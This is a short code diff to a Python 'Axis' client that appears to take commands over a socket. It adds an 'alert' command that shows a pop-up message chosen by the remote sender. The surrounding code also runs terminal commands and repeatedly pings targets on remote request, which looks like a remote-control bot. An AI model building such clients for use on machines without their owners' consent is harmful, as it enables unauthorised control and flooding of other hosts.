@@ -1,3 +1,4 @@
+import pyautogui
 import socket
 
 import axis_execute_terminal_commands
@@ -127,6 +128,13 @@ class Axis:
                     self.ping().start(payload[0], payload[1], payload[2], payload[3], False)
 
                     self.send(f'[RESULT-9]Pinged {payload[0]} {payload[1] * payload[3]} times over {payload[2] * payload[1]} seconds')
+                elif command == 'alert':
+                    message = payload[0]
+                    title = payload[1]
+                    
+                    pyautogui.alert(message, title)
+                    
+                    self.send('[RESULT-10]Alerted')
                 else:
                     print('Unknown command: ' + command)
                     self.send('Unknown command: ' + command)
